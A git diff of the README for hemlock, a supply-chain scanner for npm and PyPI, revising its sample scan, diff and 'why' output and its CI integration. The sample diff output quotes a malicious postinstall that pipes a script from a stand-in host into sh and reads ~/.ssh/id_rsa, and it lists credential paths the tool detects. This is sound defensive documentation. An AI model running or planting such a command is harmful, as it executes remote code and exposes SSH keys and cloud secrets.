@@ -13,7 +13,7 @@
 A supply-chain scanner for npm and PyPI that flags packages *behaving* like an
 attack, instead of waiting for one to get a CVE number.
 
-[![ci](https://github.com/hemlock-scan/hemlock/actions/workflows/ci.yml/badge.svg)](https://github.com/hemlock-scan/hemlock/actions/workflows/ci.yml)
+[![ci](https://github.com/xzycd/hemlock/actions/workflows/ci.yml/badge.svg)](https://github.com/xzycd/hemlock/actions/workflows/ci.yml)
 [![python](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/downloads/)
 [![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![dependencies](https://img.shields.io/badge/runtime%20dependencies-0-brightgreen)](#zero-dependencies-on-purpose)
@@ -46,29 +46,39 @@ already public and free.
 ## What it looks like
 
 ```
-  hemlock ─────────────────────────────────────  2 packages · 1 manifests · online
+  hemlock  mal ────────────────────────────────────  4 packages · 1 manifest · online · 17ms
 
-   MALWARE
-  chalk@5.6.1 is on a public malware list. Remove it, then rotate every
-  credential the install could reach.
+  ╭─ MALWARE ────────────────────────────────────────────────────────────────────────────────╮
+  │  chalk@5.6.1 is on a public malware list. Remove it, then rotate every credential the    │
+  │  install could reach.                                                                    │
+  ╰──────────────────────────────────────────────────────────────────────────────────────────╯
 
   1 package is on a public malware list.
 
-  ●  MAL     npm   chalk 5.6.1                                            malware
-     ├ HEM701  This exact version is reported as malware
-     │         MAL-2025-46969 (GHSA-2v46-p5h4-248w): Malicious code in chalk (npm)
-     └ HEM601  Published without build provenance
-               published 2025-09-08 with no attestation on the registry
-       reported malicious, so no score was calculated
+  ▌ ██████████ MAL   npm   chalk 5.6.1                                                malware
+  ▌ ├ HEM701  This exact version is reported as malware
+  ▌ │         MAL-2025-46969 (GHSA-2v46-p5h4-248w): Malicious code in chalk (npm)
+  ▌ └ HEM601  Published without build provenance
+  ▌           published 2025-09-08 with no attestation on the registry
+  ▌   reported malicious, so no score was calculated
+  ▌   via  app-kit › build-tools › chalk
+  ▌   fix  Remove it, then rotate every credential the install could reach.
 
-  ○   30     npm   express 4.18.2                                          medium
-     └ HEM702  Published advisory against this version
-               2 advisories: GHSA-qw6h-vgh9-j6wx, GHSA-rv95-896h-c2vc
-       intel 30 → 30
-       via  app-kit › build-tools › express
-       fix  Upgrade past the affected range. Look the ids up at osv.dev.
+  ▌ ███░░░░░░░   30  npm   express 4.18.2                                               medium
+  ▌ └ HEM702  Published advisory against this version
+  ▌           2 advisories: GHSA-qw6h-vgh9-j6wx, GHSA-rv95-896h-c2vc
+  ▌   intel 30 → 30
+  ▌   via  app-kit › build-tools › express
+  ▌   fix  Upgrade past the affected range. Every id above resolves at osv.dev.
 
-  ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇  2 scanned · 1 critical · 1 medium
+  ▌ ██░░░░░░░░   20  npm   build-tools 2.1.0                                               low
+  ▌ └ HEM504  Almost nobody installs this
+  ▌           207 downloads in the last week
+  ▌   registry 20 → 20
+  ▌   via  app-kit › build-tools
+  ▌   fix  Find out which dependency asked for this before trusting it.
+
+  ████████████░░░░░░  4 scanned · 1 critical · 1 medium · 1 low
   › hemlock explain HEM701   to read why any of these rules exist
 ```
 
@@ -78,6 +88,11 @@ a crypto-address swapper in September 2025 after a maintainer was phished.
 Every finding shows the evidence that produced it, and every package shows the
 arithmetic behind its score. There is no model and no vendor feed. If you
 disagree with a number, the line underneath tells you which weight to change.
+
+The coloured rail down the left is one package. The bar is its score, so you
+can rank eight results without reading a single number. The box is reserved for
+the one rule that is not a judgement call: if everything is in a box, nothing
+is.
 
 ## Install
 
@@ -104,6 +119,9 @@ hemlock explain HEM701            # why a rule exists and what to do about it
 hemlock rules                     # every check, with its weight
 ```
 
+Any scan or diff can come out as `--format terminal`, `markdown`, `json` or
+`sarif`.
+
 It finds its own work. Point it at a directory and it walks for
 `package-lock.json`, `yarn.lock`, `package.json`, `requirements.txt`,
 `poetry.lock`, `Pipfile.lock` and `pyproject.toml`. If `node_modules` or a
@@ -118,26 +136,65 @@ lockfile was somebody else's decision, and re-reading all of it on every PR is
 how people learn to skim the output.
 
 ```
-$ hemlock diff --since HEAD~1
+$ hemlock diff --since HEAD
 
-  hemlock diff ────────────────────  2 changed · 1 removed · 1 unchanged
-  HEAD~1 → working tree
+  hemlock diff  HEAD → working tree ───────────────────  2 changed · 1 removed · 9 unchanged
 
-  1 package is a keystroke or two from one you probably meant.
+  1 package reads credentials from an install script.
 
-  ●   62  +  npm   colorz 1.0.4                                       high
-     ├ HEM101  Name is a near-miss of a popular package
-     │         1 edit away from "colors"
-     └ HEM402  Lockfile entry has no integrity hash
-               colorz@1.0.4 pinned without a hash
-       naming 30 + lockfile 20 = 50  ×1.25 (2 categories agree)  →  62
+  ▌ ██████████  100  ~  npm   colorz 1.0.5  (was 1.0.4)                               critical
+  ▌ ├ HEM204  Install script touches credentials
+  ▌ │         postinstall references .ssh/id_, AWS_SECRET, id_rsa, ~/.ssh
+  ▌ ├ HEM202  Install script downloads and executes
+  ▌ │         postinstall: curl -s https://cdn.example.invalid/setup.sh | sh -; cat
+  ▌ │         ~/.ssh/id_rsa…
+  ▌ ├ HEM101  Name is a near-miss of a popular package
+  ▌ │         1 edit away from "colors"
+  ▌ └ HEM201  Runs a script at install time
+  ▌           postinstall: curl -s https://cdn.example.invalid/setup.sh | sh -; cat
+  ▌           ~/.ssh/id_rsa…
+  ▌   install 75 + naming 30 = 105  ×1.25 (2 categories agree)  →  100 capped
+  ▌   fix  Treat every credential it could reach as exposed. Rotate first, investigate
+  ▌        after.
 
-  ·       ~  npm   chalk 5.6.1  (was 5.6.0)                 nothing flagged
-  ·       -  npm   left-pad                                         removed
+  ▌ ██████░░░░   62  +  npm   reqeusts 1.0.0                                              high
+  ▌ ├ HEM101  Name is a near-miss of a popular package
+  ▌ │         2 edits away from "request"
+  ▌ └ HEM402  Lockfile entry has no integrity hash
+  ▌           reqeusts@1.0.0 pinned without a hash
+  ▌   naming 30 + lockfile 20 = 50  ×1.25 (2 categories agree)  →  62
+  ▌   fix  Compare the name against what you meant to install, then find out which
+  ▌        dependency asked for it.
+
+  ▌ ░░░░░░░░░░       -  npm   express-js                                               removed
+
+  ██████████████████  2 scanned · 1 critical · 1 high
 ```
 
-`--since` takes any git ref. Two lockfile paths work too, for comparing
-artifacts that never shared a repository.
+`+` is new, `~` moved, `-` left. `--since` takes any git ref. Two lockfile
+paths work too, for comparing artifacts that never shared a repository.
+
+### Saying it in the pull request
+
+A red X on a CI job tells a reviewer that something is wrong and nothing else.
+`--format markdown` writes the result as a comment, and the workflow from
+`hemlock init` edits the same comment on every push rather than stacking a new
+one. What lands on the pull request looks like this:
+
+> [!CAUTION]
+> `chalk@5.6.1` is on a public malware list. Remove and rotate every credential the install could reach.
+
+| | | Package | Score | Why |
+|:--:|:--:|---|--:|---|
+| 🔴 | `+` | [`chalk@5.6.1`](https://www.npmjs.com/package/chalk/v/5.6.1) | **malware** | This exact version is reported as malware, and 1 more |
+| 🟡 | `~` | [`express@4.18.2`](https://www.npmjs.com/package/express/v/4.18.2) | 30 | Published advisory against this version |
+
+<sub>2 changed · 1 critical · 1 medium · online · hemlock 0.4.0</sub>
+
+The evidence for every row sits under a `<details>` fold, so the comment stays
+one screen tall on a pull request that added forty packages. Every package name
+links to its registry page, because the next thing anyone does with a name they
+do not recognise is search for it.
 
 ### Adopting it on a codebase that already has a backlog
 
@@ -166,26 +223,30 @@ Several rules end by telling you to work out which dependency pulled something
 in. That was poor advice from a tool that could not answer it.
 
 ```
-$ hemlock why colorz
+$ hemlock why chalk --online
 
-  colorz 1.0.4  npm
-  package-lock.json
+  chalk 5.6.1  npm  ·  package-lock.json
+  ██████████   malware
 
   reached through
-    app-kit › build-tools › colorz
+    app-kit
+    └ build-tools
+      └ chalk
 
   flagged
-    HEM101  Name is a near-miss of a popular package
-            1 edit away from "colors"
+    HEM701  This exact version is reported as malware
+            MAL-2025-46969 (GHSA-2v46-p5h4-248w): Malicious code in chalk (npm)
+    HEM601  Published without build provenance
+            published 2025-09-08 with no attestation on the registry
 
-  fix  Compare the name against what you meant to install, then find out which
-       dependency asked for it.
+  fix  Remove it, then rotate every credential the install could reach.
 ```
 
-Routes are built from the lockfiles hemlock already read, following npm's own
-resolution order, so a nested copy of a package wins over a hoisted one.
-Transitive findings in the normal scan view carry the same route on a `via`
-line.
+Depth is the thing you are looking for, so depth is what the indentation
+shows. Routes are built from the lockfiles hemlock already read, following
+npm's own resolution order, so a nested copy of a package wins over a hoisted
+one. Transitive findings in the normal scan view carry the same route on a
+`via` line.
 
 ### The part worth trying first
 
@@ -376,6 +437,17 @@ Exit codes: `0` when nothing reaches the threshold, `1` when something does,
 `2` when the scan could not run. Set the threshold with
 `--fail-on low|medium|high|critical|never`.
 
+To leave the result on the pull request instead of only in the job log, write
+the Markdown report and hand it to `gh`. The comment carries a hidden marker,
+so `--edit-last` finds the previous one and replaces it:
+
+```yaml
+- run: hemlock diff --since origin/${{ github.base_ref }} --format markdown > hemlock.md
+- run: gh pr comment ${{ github.event.number }} --body-file hemlock.md --edit-last --create-if-none
+  env:
+    GH_TOKEN: ${{ github.token }}
+```
+
 For GitHub code scanning, emit SARIF and hand it to the upload action, which
 puts findings inline on the pull request that introduced them:
 
@@ -405,6 +477,34 @@ Suppressions take a reason and an expiry, and hemlock reports the expired ones
 back to you rather than honouring them forever. An ignore with no end date
 outlives whoever added it, and that is how a scanner quietly stops finding
 anything.
+
+## About the output
+
+The terminal view is the product, so it degrades in three independent
+directions rather than all at once.
+
+Colour goes from 24-bit to the 256 palette to nothing, decided by `COLORTERM`,
+`TERM`, `NO_COLOR` and whether stdout is a terminal at all. `--color always`
+beats the environment, because a flag typed just now is a more specific
+instruction than a variable exported months ago.
+
+Box drawing falls back to ASCII when the encoding cannot promise UTF-8. That
+path is tested rather than hoped for: a test renders every view with the ASCII
+table forced and asserts that not one Unicode glyph survives.
+
+Hyperlinks appear only where something can click them. Package names open their
+registry page and advisory ids open osv.dev, over OSC 8, which terminals that
+do not implement it ignore. Files and pipes do not ignore it, so links switch
+off the moment stdout is not a terminal.
+
+None of that is allowed to move a column. Every row is placed by measuring
+visible width with the escapes stripped, and a test renders the same scan with
+links on and off and asserts the two come out the same shape.
+
+The wordmark animates once, on `hemlock` with no arguments, for about 200ms. It
+is off under CI, off without a terminal, off without colour, and off when
+`HEMLOCK_NO_ANIMATION` is set. Anything that delays a pipe or corrupts a
+redirect has stopped being decoration and started being a bug.
 
 ## Zero dependencies, on purpose
 
@@ -465,7 +565,8 @@ hemlock/
   intel.py       OSV: malware reports and advisories, one batched call
   provenance.py  SLSA and PEP 740 attestations, normalised to one shape
   policy.py      .hemlock.toml
-  report.py      terminal, JSON, SARIF
+  report.py      what goes on the page: terminal, Markdown, JSON, SARIF
+  ui.py          how it looks: colour depth, gauges, rails, panels, links
   data.py        typosquat corpus, homoglyphs, credential paths
 ```
 
@@ -486,7 +587,7 @@ def insecure_transport(pkg, ctx):
 ## Development
 
 ```bash
-git clone https://github.com/hemlock-scan/hemlock
+git clone https://github.com/xzycd/hemlock
 cd hemlock
 pip install -e ".[dev]"
 pytest -q
